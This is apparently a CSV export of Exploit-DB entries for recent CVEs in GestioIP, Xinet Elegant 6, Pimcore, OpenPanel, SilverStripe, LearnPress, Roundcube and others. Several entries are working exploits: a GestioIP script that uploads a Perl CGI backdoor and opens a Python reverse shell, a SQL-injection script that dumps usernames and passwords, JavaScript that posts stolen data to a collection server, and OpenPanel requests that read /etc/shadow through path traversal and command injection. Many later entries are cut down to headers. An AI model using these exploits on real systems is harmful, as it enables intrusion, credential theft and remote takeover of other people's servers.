CVE-2024-50858,2025-04-14,exploit db,"# Exploit Title: GestioIP 3.5.7 - GestioIP Vulnerability: Auth. Cross-Site Request Forgery (CSRF) # Exploit Author: m4xth0r (Maximiliano Belino) # Author website: https://maxibelino.github.io/ # Author email : max.cybersecurity at belino.com # GitHub disclosure link: https://github.com/maxibelino/CVEs/tree/main/CVE-2024-50858 # Date: 2025-01-13 # Vendor Homepage: https://www.gestioip.net/ # Software Link: https://www.gestioip.net/en/download/ # Version: GestioIP v3.5.7 # Tested on: Kali Linux # CVE: CVE-2024-50858 ### Description The GestioIP application has many endpoints and they are vulnerable to CSRF. This allows an attacker to execute actions through the admin's browser on the application if the admin visits a malicious URL hosted by the attacker. These actions can modify, delete, or exfiltrate data from the application. ### Prerequisites The option ""Manage - Manage GestioIP - User Management"" must be enabled previously. ### Usage To exploit this vulnerability, an attacker must host ```payload.html``` on an attacker-controlled web server (python3 -m http.server 8090). When an authenticated administrator goes to the attacker's website, the CSRF will execute making the attacker an administrator. ### File: payload.html #### example: editing user named 'maxi' Welcome to our site Thank you for visiting our site! We are processing your request, please wait a moment..."
CVE-2024-50861,2025-04-14,exploit db,"# Exploit Title: GestioIP 3.5.7 - GestioIP Vulnerability: Auth. Stored Cross-Site Scripting # Exploit Author: m4xth0r (Maximiliano Belino) # Author website: https://maxibelino.github.io/ # Author email: max.cybersecurity at belino.com # GitHub disclosure link: https://github.com/maxibelino/CVEs/tree/main/CVE-2024-50861 # Date: 2025-01-13 # Vendor Homepage: https://www.gestioip.net/ # Software Link: https://www.gestioip.net/en/download/ # Version: GestioIP v3.5.7 # Tested on: Kali Linux # CVE: CVE-2024-50861 ### Description The http://localhost/gestioip/res/ip_mod_dns_key_form.cgi feature of GestioIP 3.5.7 is vulnerable to Stored XSS. An authenticated attacker with appropriate permissions can inject malicious code into the tsig_key form field and save it to the database. Once saved, any user who accesses the ""DNS Key"" page will trigger the Stored XSS, leading to the execution of malicious code. ### Prerequisites 1. Enable ""DNS Key"" Feature First, ensure that ""Dynamic DNS updates"" is enabled in the global configuration: Manage > Manage GestioIP > Global Configuration > Dynamic DNS updates enabled: yes This will enable the following menus: Manage > DNS Keys Manage > DNS Update User 2. Create a DNS Key Entry To create a new DNS key entry and also edit an existing one, the user must belong to a group with the ""Manage Sites And Categories"" permission. By default, ""Admin"" and ""GestioIP Admin"" groups have this permission. Also, you can configure this permission to any group under: Manage > User Groups > Manage Sites and Categories 3. Enter payload. Once group permission is set, input one of the following payloads into the ""TSIG Key"" (tsig_key) field and save it. ### Payloads 1 - Test basic XSS 2 - Send data (cookies) to the attacker's server 3 - Redirect the user to a malicious site"
CVE-2024-50859,2025-04-14,exploit db,"# Exploit Title: GestioIP 3.5.7 - Reflected Cross-Site Scripting (Reflected XSS) # Exploit Author: m4xth0r (Maximiliano Belino) # Author website: https://maxibelino.github.io/ # Author email (max.cybersecurity at belino.com) # GitHub disclosure link: https://github.com/maxibelino/CVEs/tree/main/CVE-2024-50859 # Date: 2025-01-13 # Vendor Homepage: https://www.gestioip.net/ # Software Link: https://www.gestioip.net/en/download/ # Version: GestioIP v3.5.7 # Tested on: Kali Linux # CVE: CVE-2024-50859 ### Description The ip_import_acl_csv request is vulnerable to Reflected XSS (Reflected Cross-Site Scripting); the user can upload a file and the file content is reflected in the HTML response without being sanitized. If the file uploaded by the user has an incorrect format and an error occurs during its processing, part of the file's content may be displayed in the browser. If this content includes HTML or scripts and it is not properly escaped, the browser could interpret it, leading to a security vulnerability. This could allow data exfiltration and enabling CSRF (Cross-Site Request Forgery) attacks. Proper input validation and output encoding are critical to prevent this vulnerability. ### Prerequisites Enable (set to 'yes') the parameter: Manage > Manage GestioIP > ACL connection management ### Usage Select: import/export > Import ACLs/ACL Connections Select: ""Connection List"" Select ""report only"" Browse to select the file you want to upload. Click 'upload' ### Payloads #### 1) html file to upload #### 2) js file to exfiltrate data var req1 = new XMLHttpRequest(); req1.open('GET',""http://localhost/gestioip/res/ip_show_user.cgi"", false); req1.send(); response = req1.responseText; var req2 = new XMLHttpRequest(); req2.open('POST', ""http://10.20.0.1:8000/steal_data"", false); req2.setRequestHeader('Content-Type', 'text/html'); req2.send(response);"
CVE-2024-50857,2025-04-14,exploit db,"# Exploit Title: GestioIP 3.5.7 - GestioIP Vulnerability: Auth. Cross-Site Scripting (XSS) # Exploit Author: m4xth0r (Maximiliano Belino) # Author website: https://maxibelino.github.io/ # Author email (max.cybersecurity at belino.com) # GitHub disclosure link: https://github.com/maxibelino/CVEs/tree/main/CVE-2024-50857 # Date: 2025-01-13 # Vendor Homepage: https://www.gestioip.net/ # Software Link: https://www.gestioip.net/en/download/ # Version: GestioIP v3.5.7 # Tested on: Kali Linux # CVE: CVE-2024-50857 ### Description The `""ip_do_job""` feature of GestioIP 3.5.7 is vulnerable to XSS, leading to data exfiltration and CSRF attacks. Two examples are described below. ### Prerequisites To successfully exploit the XSS vulnerability, the user must be part of a ""User Group"" that has the following three permissions: • Show backuped device configurations (read_device_config_perm) • Upload device configurations (write_device_config_perm) • Administrate CM (administrative_cm_perm) 1) vulnerable parameter: `host_id` http://localhost/gestioip/res/cm/ip_do_job.cgi?client_id=1&host_id=' ' 2) vulnerable parameter: `stored_config` http://localhost/gestioip/res/cm/ip_do_job.cgi?client_id=1&stored_config=' '"
CVE-2024-48760,2025-04-14,exploit db,"# Exploit Title: GestioIP 3.5.7 - Remote Command Execution (RCE) # Exploit Author: m4xth0r (Maximiliano Belino) # Author website: https://maxibelino.github.io/ # Author email (max.cybersecurity at belino.com) # GitHub disclosure link: https://github.com/maxibelino/CVEs/tree/main/CVE-2024-48760 # Date: 2025-01-13 # Vendor Homepage: https://www.gestioip.net/ # Software Link: https://www.gestioip.net/en/download/ # Version: GestioIP v3.5.7 # Tested on: Kali Linux # CVE: CVE-2024-48760 import requests import sys # Config username = ""gipadmin"" password = ""PASSWORD"" domain = ""localhost"" local_ip = ""10.20.0.1"" local_port = 443 target_url = f""http://{domain}/gestioip/api/upload.cgi"" # CGI Backdoor Perl backdoor_code = """"""#!/usr/bin/perl -w use strict; print ""Cache-Control: no-cache\\n""; print ""Content-type: text/html\\n\\n""; my $req = $ENV{QUERY_STRING}; chomp ($req); $req =~ s/%20/ /g; $req =~ s/%3b/;/g; $req =~ s/%7c/|/gi; $req =~ s/%27/'/g; $req =~ s/%22/""/g; $req =~ s/%5D/]/g; $req =~ s/%5B/[/g; print "" ""; print ' '; if (!$req) { print ""Usage: http://domain/gestioip/api/upload.cgi?whoami""; } else { print ""Executing: $req""; print "" ""; my @cmd = `$req`; print "" ""; foreach my $line (@cmd) { print $line . "" ""; print "" ""; # Exploit functions def upload_file(session, file_name, file_data): """"""Uploads the file to the server"""""" files = { 'file_name': (None, file_name), 'leases_file': (file_name, file_data) response = session.post(target_url, files=files) if ""OK"" not in response.text: print(f""[!] Error uploading {file_name}."") sys.exit(1) return response def run_command(session, cmd): """"""Execute a command in the server through the vuln"""""" url = target_url + '?' + cmd resp = session.get(url) print(resp.text) def backdoor_exists(session): """"""Verifies if backdoor is already uploaded or not"""""" response = session.get(target_url + ""?whoami"") if ""www-data"" in response.text: return True # backdoor already uploaded return False # backdoor not uploaded yet if __name__ == '__main__': with requests.Session() as session: session.auth = (username, password) # Verify if backdoor is already uploaded if not backdoor_exists(session): print(""\n[!] Uploading backdoor...\n"") upload_file(session, 'upload.cgi', backdoor_code) else: print(""\n[+] Backdoor already uploaded. Continue...\n"") # Execute the reverse shell print(""\n[!] Executing reverse shell...\n"") reverse_shell_cmd = f'python3 -c ""import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{local_ip}\', {local_port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\'/bin/sh\', \'-i\']);""' run_command(session, reverse_shell_cmd)"
CVE-2019-19245,2025-04-14,exploit db,"# Exploit Title: Xinet Elegant 6 Asset Lib Web UI 6.1.655 - SQL Injection # Exploit author: hyp3rlinx import requests,time,re,sys,argparse #NAPC Xinet Elegant 6 Asset Library v6.1.655 #Pre-Auth SQL Injection 0day Exploit #By hyp3rlinx #ApparitionSec #UPDATED: Jan 2024 for python3 #TODO: add SSL support #This will dump tables, usernames and passwords in vulnerable versions #REQUIRE PARAMS: LoginForm[password]=&LoginForm[rememberMe]=0&LoginForm[username]=SQL&yt0 #SQL INJECTION VULN PARAM --> LoginForm[username] IP="""" PORT=""80"" URL="""" NUM_INJECTS=20 k=1 j=0 TABLES=False CREDS=False SHOW_SQL_ERROR=False def vuln_ver_chk(): global IP, PORT TARGET = ""http://""+IP+"":""+PORT+""/elegant6/login"" response = requests.get(TARGET) if re.findall(r'\bElegant"",appVersion:""6.1.655\b', response.content.decode()): print(""[+] Found vulnerable NAPC Elegant 6 Asset Library version 6.1.655."") return True print(""[!] Version not vulnerable :("") return False def sql_inject_request(SQL): global IP, PORT URL = ""http://""+IP+"":""+PORT+""/elegant6/login"" tmp="""" headers = {'User-Agent': 'Mozilla/5.0'} payload = {'LoginForm[password]':'1','LoginForm[rememberMe]':'0','LoginForm[username]':SQL} session = requests.Session() res = session.post(URL,headers=headers,data=payload) idx = res.content.decode('utf-8').find('CDbCommand') # Start of SQL Injection Error in response idx2 = res.content.decode('utf-8').find('key 1') # End of SQL Injection Error in response return res.content[idx : idx2+3] #Increments SQL LIMIT clause 0,1, 1,2, 1,3 etc def inc(): global k,j while j < NUM_INJECTS: j+=1 if k !=1: k+=1 return str(j)+','+str(k) def tidy_up(results): global CREDS idx = results.find(""'"".encode()) if idx != -1: idx2 = results.rfind(""'"".encode()) if not CREDS: return results[idx + 1: idx2 -2] else: return results[idx + 2: idx2] def breach(i): global k,j,NUM_INJECTS,SHOW_SQL_ERROR result="""" #Dump Usernames & Passwords if CREDS: if i % 2 == 0: target='username' else: target='password' SQL=('""and (select 1 from(select count(*),concat((select(select concat(0x2b,'+target+'))' 'from user limit '+str(i)+', 1),floor(rand(0)*2))x from user group by x)a)-- -') if not SHOW_SQL_ERROR: result = tidy_up(sql_inject_request(SQL)) if result: result = result.decode() else: result = sql_inject_request(SQL)+""\n"" if result: result = result.decode() print(""[+] Dumping ""+str(target)+"": ""+str(result)) #Dump Tables if TABLES: while j < NUM_INJECTS: nums = inc() SQL=('""and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database()' 'limit '+nums+'),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -') if not SHOW_SQL_ERROR: result = tidy_up(sql_inject_request(SQL)) else: result = sql_inject_request(SQL) + ""\n"" if result: print(""[+] Dumping Table... "" +str(result.decode())) time.sleep(0.3) def parse_args(): parser = argparse.ArgumentParser() parser.add_argument(""-i"", ""--ip_address"", help="" ."") parser.add_argument(""-p"", ""--port"", help=""Port, Default is 80"") parser.add_argument(""-t"", ""--get_tables"", nargs=""?"", const=""1"", help=""Dump Database Tables."") parser.add_argument(""-c"", ""--creds"", nargs=""?"", const=""1"", help=""Dump Database Credentials."") parser.add_argument(""-m"", ""--max_injects"", nargs=""?"", const=""1"", help=""Max SQL Injection Attempts, Default is 20."") parser.add_argument(""-s"", ""--show_sql_errors"", nargs=""?"", const=""1"", help=""Display SQL Errors, Default is Clean Dumps."") parser.add_argument(""-e"", ""--examples"", nargs=""?"", const=""1"", help=""Show script usage."") return parser.parse_args() def usage(): print(""Dump first ten rows of usernames and passwords"") print(""NAPC-Elegant-6-SQL-Exploit.py -i -c -m 10\n"") print(""\nDump first five rows of database tables and show SQL errors"") print(""NAPC-Elegant-6-SQL-Exploit.py -i -t -m 5 -s\n"") print(""NAPC-Elegant-6-SQL-Exploit.py -i -p80 -t -c -m30\n"") exit(0) def main(args): global TABLES,CREDS,URL,IP,NUM_INJECTS,SHOW_SQL_ERROR if args.ip_address: IP=args.ip_address if args.port: PORT=args.port if args.get_tables: TABLES=True if args.creds: CREDS=True if args.max_injects: NUM_INJECTS = int(args.max_injects) if args.show_sql_errors: SHOW_SQL_ERROR=True if args.examples: usage() if vuln_ver_chk(): for i in range(0, NUM_INJECTS): breach(i) time.sleep(0.3) if __name__=='__main__': parser = argparse.ArgumentParser() print(""NAPC Elegant 6 Asset Library v6.1.655"") print(""Pre-Authorization SQL Injection 0day Exploit"") print(""Discovery / eXploit By hyp3rlinx"") print(""ApparitionSec\n"") time.sleep(0.5) if len(sys.argv)== 1: parser.print_help(sys.stderr) sys.exit(0) main(parse_args())"
CVE-2024-11956,2025-04-14,exploit db,"# Exploit Title: Pimcore customer-data-framework 4.2.0 - SQL injection # Date: 01/28/2025 # Exploit Author: maeitsec # Vendor Homepage: https://pimcore.com/ # Software Link: https://github.com/pimcore/pimcore # Version: Pimcore versions prior to 10.5.21 # Tested on: Ubuntu 20.04 with Pimcore 10.5.20 # CVE: CVE-2024-11956 import requests # Replace with target URL and credentials TARGET_URL = ""http://example.com/pimcore"" USERNAME = ""low_privilege_user"" PASSWORD = ""password123"" # Authenticate and get session session = requests.Session() login_data = { ""username"": USERNAME, ""password"": PASSWORD login_response = session.post(f""{TARGET_URL}/admin/login"", data=login_data) if ""Login successful"" in login_response.text: print(""[+] Authenticated successfully."") # Exploit the downloadAsZip functionality download_url = f""{TARGET_URL}/admin/asset/download-as-zip"" payload = { ""ids[]"": [""1"", ""2"", ""3""] # Replace with IDs of restricted files/folders download_response = session.post(download_url, data=payload) if download_response.status_code == 200: print(""[+] Exploit successful. Restricted files downloaded."") with open(""restricted_files.zip"", ""wb"") as f: f.write(download_response.content) else: print(""[-] Exploit failed. Server returned:"", download_response.status_code) else: print(""[-] Authentication failed."")"
CVE-2024-11954,2025-04-14,exploit db,"# Exploit Title: Authenticated Stored Cross-Site Scripting (XSS) Via Search Document # Google Dork: N/A # Date: 1/28/2025 # Exploit Author: maeitsec # Vendor Homepage: https://pimcore.com/ # Software Link: https://github.com/pimcore/pimcore # Version: Pimcore 10.5.x (prior to 10.5.21) and 11.x (prior to 11.1.1) # Tested on: Pimcore 10.5.20 on Ubuntu 20.04 # CVE: CVE-2024-11954 ### Description: A stored Cross-Site Scripting (XSS) vulnerability exists in Pimcore's Data Object Classification Store functionality. The vulnerability arises due to insufficient input sanitization, allowing an authenticated attacker with access to the classification store to inject malicious JavaScript code. This code is then executed in the context of other users' browsers when they view the affected data. ### Proof of Concept ("
CVE-2024-53537,2025-04-14,exploit db,"# Exploit Title: OpenPanel 0.3.4 - Directory Traversal # Date: Dec 05, 2024 # Exploit Author: Korn Chaisuwan, Punthat Siriwan, Pongtorn Angsuchotmetee # Vendor Homepage: https://openpanel.com/ # Software Link: https://openpanel.com/ # Version: 0.3.4 # Tested on: macOS # CVE : CVE-2024-53537 ### Compress Function ### POST /compress_files HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FF_x2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://demo.openpanel.org:2083/files/ Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 96 Origin: https://demo.openpanel.org:2083 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers archiveName=/home/stefan/test/test3&selectedFiles%5B%5D=shadow&pathParam=../../etc&extension=tar ### Copy Function ### POST /copy_item?item_name=shadow&path_param=/etc&item_type=text%2Fplain&destination_path=/home/stefan/ HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FF_x2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://demo.openpanel.org:2083/files/ Origin: https://demo.openpanel.org:2083 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Content-Length: 0 Te: trailers ### Download Function ### GET /download_file/shadow?path_param=/etc HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FF_x2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://demo.openpanel.org:2083/files/ Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers ### View Function ### GET /view_file?filename=shadow&path_param=/etc HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FF_x2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://demo.openpanel.org:2083/files/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers"
CVE-2024-53582,2025-04-14,exploit db,"# Exploit Title: OpenPanel 0.3.4 - Incorrect Access Control # Date: Nov 25, 2024 # Exploit Author: Korn Chaisuwan, Punthat Siriwan, Pongtorn Angsuchotmetee # Vendor Homepage: https://openpanel.com/ # Software Link: https://openpanel.com/ # Version: 0.3.4 # Tested on: macOS # CVE : CVE-2024-53582 GET /files/../.. HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyEag.70MOWk6Q4cZWoRbciZO94dsGxgw User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://demo.openpanel.org:2083/files/ X-Requested-With: XMLHttpRequest Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers"
CVE-2024-53584,2025-04-14,exploit db,"# Exploit Title: OpenPanel 0.3.4 - OS Command Injection # Date: Nov 25, 2024 # Exploit Author: Korn Chaisuwan, Punthat Siriwan, Pongtorn Angsuchotmetee # Vendor Homepage: https://openpanel.com/ # Software Link: https://openpanel.com/ # Version: 0.3.4 # Tested on: macOS # CVE : CVE-2024-53584 POST /server/timezone HTTP/2 Host: demo.openpanel.org:2083 Cookie: minimenu=0; session=eyJfZnJlc2giOmZhbHNlLCJ1c2VyX2lkIjozfQ.ZyyaKQ.HijWQTQ_I0yftDYEqqqqRR_FuRU; theme=dark User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://demo.openpanel.org:2083/server/timezone Content-Type: application/x-www-form-urlencoded Content-Length: 51 Origin: https://demo.openpanel.org:2083 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers timezone=;cat+/etc/shadow+>+/home/stefan/secret.txt"
CVE-2024-53582,2025-04-14,exploit db,"# Exploit Title: OpenPanel Copy and View functions in the File Manager 0.3.4 - Directory Traversal # Date: Nov 25, 2024 # Exploit Author: Korn Chaisuwan, Punthat Siriwan, Pongtorn Angsuchotmetee # Vendor Homepage: https://openpanel.com/ # Software Link: https://openpanel.com/ # Version: 0.3.4 # Tested on: macOS # CVE : CVE-2024-53582 GET /view_file?filename=shadow&path_param=/etc HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FF_x2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://demo.openpanel.org:2083/files/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers"
CVE-2024-47605,2025-04-14,exploit db,"# Exploit Title: SilverStripe 5.3.8 - Stored Cross Site Scripting (XSS) (Authenticated) # Date: 2025-01-15 # Exploit Author: James Nicoll # Vendor Homepage: https://www.silverstripe.org/ # Software Link: https://www.silverstripe.org/download/ # Category: Web Application # Version: 5.2.22 # Tested on: SilverStripe 5.2.22 - Ubuntu 24.04 # CVE : CVE-2024-47605 ## Explanation: When using the ""insert media"" functionality, the linked oEmbed JSON includes an HTML attribute which will replace the embed shortcode. The HTML is not sanitized before replacing the shortcode, allowing a script payload to be executed on both the CMS and the front-end of the website. ## Requirements 1. A Silverstripe CMS website. 2. Valid login credentials for a user with page edit rights. 3. An attacker server hosting malicious payload. ## On the attacker server: 1. Create an html file with oembded information: 2. Create the json file with XSS payload: ""title"": ""Title"", ""author_name"": ""author"", ""type"": ""video"", ""height"": 113, ""width"": 200, ""version"": ""1.0"", ""provider_name"": ""FakeSite"", ""thumbnail_height"": 360, ""thumbnail_width"": 480, ""thumbnail_url"": ""http:// /media.jpg"", ""html"":"" "" 3. The media.jpg file can be any image. 4. Host these files on a publicly available website ## On the SilverStripe website: 1. Log into the admin portal with a user account that has page editor rights (or higher). 2. Select the page you wish to load the malicious content into. 3. Within the editor panel, select the ""Insert Media via URL"" button. 4. Enter the IP/Hostname of the attacker server. 5. Click Add Media, Insert Media, and then save and publish the page."
CVE-2024-51774,2025-04-11,exploit db,# Exploit Title: qBittorrent 5.0.1 MITM RCE # Date: 01/02/2025 # Exploit Author: Jordan Sharp # Vendor Homepage: https://github.com/qbittorrent/qBittorrent # Software Link: https://www.qbittorrent.org/download # Version: < 5.0.1 # Tested on: Windows 10 # CVE : CVE-2024-51774 Run the
CVE-2019-13961,2025-04-11,exploit db,# Exploit Title: flatCore 1.5 - Cross Site Request Forgery (CSRF) # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://github.com/flatCore/flatCore-CMS # Software Link: https://github.com/flatCore/flatCore-CMS # Version: d3a5168 # Tested on: Ubuntu Windows # CVE : CVE-2019-13961
CVE-2020-18662,2025-04-11,exploit db,# Exploit Title: Gnuboard5 5.3.2.8 - SQL Injection # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://github.com/gnuboard/gnuboard5 # Software Link: https://github.com/gnuboard/gnuboard5 # Version: 5.3.2.8 # Tested on: Ubuntu Windows # CVE : CVE-2020-18662
CVE-2021-28976,2025-04-11,exploit db,# Exploit Title: GetSimpleCMS 3.3.16 - Remote Code Execution (RCE) # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://github.com/GetSimpleCMS/GetSimpleCMS # Software Link: https://github.com/GetSimpleCMS/GetSimpleCMS # Version: 3.3.16 # Tested on: Ubuntu Windows # CVE : CVE-2021-28976
CVE-2021-44567,2025-04-11,exploit db,# Exploit Title: RosarioSIS 7.6 - SQL Injection # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://gitlab.com/francoisjacquet/rosariosis # Software Link: https://gitlab.com/francoisjacquet/rosariosis # Version: 7.6 # Tested on: Ubuntu Windows # CVE : CVE-2021-44567
CVE-2023-30258,2025-04-11,exploit db,# Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://github.com/magnussolution/magnusbilling7 # Software Link: https://github.com/magnussolution/magnusbilling7 # Version: 7.3.0 # Tested on: Centos # CVE : CVE-2023-30258
CVE-2024-8522,2025-04-11,exploit db,"# Exploit Title: LearnPress WordPress LMS Plugin 4.2.7 - SQL Injection # Google Dork: inurl:""/wp-json/learnpress/v1/"" OR inurl:""/wp-content/plugins/learnpress/"" OR ""powered by LearnPress"" AND ""version 4.2.7"" # Date: [Current Date, e.g., October 30, 2024] # Exploit Author: [Your Name or Username] # Vendor Homepage: https://thimpress.com/learnpress/ # Software Link: https://wordpress.org/plugins/learnpress/ # Version: <= 4.2.7 # Tested on: WordPress 6.x, Ubuntu 22.04 CVE : CVE-2024-8522CVE-2024-8522 - SQL Injection in LearnPress WordPress Plugin (Python exploit) Overview CVE: CVE-2024-8522 Plugin: LearnPress – WordPress LMS Plugin (version <= 4.2.7) Type: SQL Injection Impact: High Affected Component: Unauthenticated endpoint parameter c_only_fields in LearnPress API Description The vulnerability exists in the LearnPress WordPress plugin, versions up to 4.2.7. An unauthenticated SQL Injection flaw is present in the c_only_fields parameter of the LearnPress API endpoint. This flaw allows attackers to execute arbitrary SQL commands by manipulating API requests without authentication. If exploited, this could lead to unauthorized database access, potentially exposing sensitive data or even allowing administrative control through database manipulation. Affected Code Path The vulnerability is triggered by accessing the LearnPress API and injecting SQL commands through the c_only_fields parameter. Below is the code path leading to this vulnerability: plaintext class-lp-db.php:702, LP_Database->execute() class-lp-course-db.php:564, LP_Course_DB->get_courses() Courses.php:241, LearnPress\Models\Courses::get_courses() class-lp-rest-courses-v1-controller.php:502, LP_Jwt_Courses_V1_Controller->get_courses() class-wp-rest-server.php:1230, WP_REST_Server->respond_to_request() class-wp-rest-server.php:1063, WP_REST_Server->dispatch() Proof of Concept ("
CVE-2024-51378,2025-04-11,exploit db,"# Exploit Title: CyberPanel 2.3.6 - Remote Code Execution (RCE) # Date: 10/29/2024 # Exploit Author: Luka Petrovic (refr4g) # Vendor Homepage: https://cyberpanel.net/ # Software Link: https://github.com/usmannasir/cyberpanel # Version: 2.3.5, 2.3.6, 2.3.7 (before patch) # Tested on: Ubuntu 20.04, CyberPanel v2.3.5, v2.3.6, v2.3.7 (before patch) # CVE: CVE-2024-51378"
CVE-2024-37383,2025-04-11,exploit db,"# Exploit Title: Roundcube Webmail 1.6.6 - Stored Cross Site Scripting (XSS) # Google Dork: # Exploit Author: AmirZargham # Vendor Homepage: Roundcube - Free and Open Source Webmail Software # Software Link: Releases · roundcube/roundcubemail # Version: Roundcube client version earlier than 1.5.6 or from 1.6 to 1.6.6. # Tested on: firefox,chrome # CVE: CVE-2024-37383 # CWE: CWE-79 # Platform: MULTIPLE # Type: WebApps Description: The CVE-2024-37383 vulnerability was discovered in the Roundcube Webmail email client. This is a stored XSS vulnerability that allows an attacker to execute JavaScript code on the user's page. To exploit the vulnerability, all attackers need to do is open a malicious email using a Roundcube client version earlier than 1.5.6 or from 1.6 to 1.6.6. Usage Info:1 - open the Roundcube_mail_server_exploit_for_CVE-2024-37383.txt and export js file.2 - Change the web address of the original email (target) and the URL of the receiving server (attacker server).3 - You can put the code in file SVG tag and send it to the server. (can use this https://github.com/bartfroklage/CVE-2024-37383-"
CVE-2024-10758,2025-04-11,exploit db,"# Exploit Title: NEWS-BUZZ News Management System 1.0 - SQL Injection # Google Dork: N/A # Exploit Author: egsec # Date: 2024-11-03 # Vendor Homepage: https://code-projects.org # Software Link: https://code-projects.org/content-management-system-in-php-with-source-code-2/ # Version: 1.0 # Tested on: Windows 11 Pro # Impact: The manipulation of the argument user_name with an unknown input leads to a sql injection vulnerability # CVE : CVE-2024-10758 ## Vulnerability Description: There is a SQL injection vulnerability in the login part of the index.php file. It allows an attacker to manipulate the SQL query and potentially perform unauthorized actions on the database. ## Vulnerable code section: In the source code, you can find vulnerable code in the NEWS-BUZZ/login.php file: In this line, the $username variable is directly embedded into the SQL query without proper handling. This allows an attacker to inject malicious SQL code. ## Proof of Concept ("
CVE-2018-1000638,2025-04-11,exploit db,# Exploit Title: MiniCMS 1.1 - Cross Site Scripting (XSS) # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://github.com/bg5sbk/MiniCMS # Software Link: https://github.com/bg5sbk/MiniCMS # Version: 1.10 # Tested on: Ubuntu Windows # CVE : CVE-2018-1000638
CVE-2023-24657,2025-04-11,exploit db,# Exploit Title: phpIPAM 1.6 - Reflected Cross Site Scripting (XSS) # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://github.com/phpipam/phpipam # Software Link: https://github.com/phpipam/phpipam # Version: 1.5.1 # Tested on: Ubuntu Windows # CVE : CVE-2023-24657
